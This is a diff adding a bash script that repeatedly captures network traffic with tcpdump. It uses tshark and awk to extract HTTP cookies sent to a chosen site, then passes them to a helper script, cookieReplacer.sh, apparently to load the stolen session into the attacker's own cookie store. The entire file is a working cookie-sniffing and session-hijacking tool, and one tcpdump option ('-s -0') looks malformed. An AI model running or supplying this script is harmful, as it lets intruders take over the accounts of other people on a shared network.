@@ -1,0 +1,32 @@
+#!/bin/bash
+
+cookieFile=$1
+site=$2
+
+if [ -s file.pcap ];
+then 
+	sudo rm file.pcap
+fi
+
+while :
+do
+	touch file.pcap
+	timeout 10 sudo tcpdump -s -0 -l -A -i any -w file.pcap &
+	sleep 10
+
+	tshark -r file.pcap -T fields -e http.host -e http.cookie -Y http.cookie \
+	| awk -F'\t' \
+	'{
+	if("'"$site"'"==$1) {
+		print $2 > "cookie";
+		system("/bin/bash ./cookieReplacer.sh ""'"$cookieFile"'"" ""'"$site"'");
+		exit 2;
+		}
+	}'
+
+	if [ "$?" -eq 2 ]; then
+		exit 0;
+	fi
+done
+
+	
